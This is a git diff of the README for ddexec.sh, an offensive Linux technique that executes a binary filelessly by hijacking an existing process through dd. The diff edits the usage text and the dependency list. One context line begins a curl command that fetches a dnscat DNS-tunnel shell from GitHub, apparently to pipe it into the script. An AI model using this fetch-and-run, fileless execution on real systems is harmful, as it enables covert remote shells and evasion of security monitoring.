@@ -5,7 +5,7 @@ In Linux in order to run a program it must exist as a file, it must be accessibl
 But this technique is here to change all of this. If you can not start the process you want... then you hijack one already existing.
 
 ## Usage
-Pipe into the `ddexec.sh` script the base64 of the binary you want to run (**without** newlines). The arguments for the script are the arguments for the program (starting with `argv[0]`).
+Pipe into the `ddexec.sh` script thebinary you want to run (**without** newlines). The arguments for the script are the arguments for the program (starting with `argv[0]`).
 
 Here, try this:
 ```
@@ -19,18 +19,8 @@ curl -L --output - https://github.com/ralvares/dns-shell/blob/main/dnscat?raw=tr
 ## Dependencies
 This script depends on the following tools to work.
 ```
-tail | dd | hexdump | any other program that allows us to seek through a fd
 bash | zsh | ash (busybox)
-head
-tail
-cut
-grep
-od
-readlink
-wc
-tr
-basename
-base64
+tail | dd | hexdump | cmp | xxd | any other program that allows us to seek through a fd
 ```
 
 ## The technique
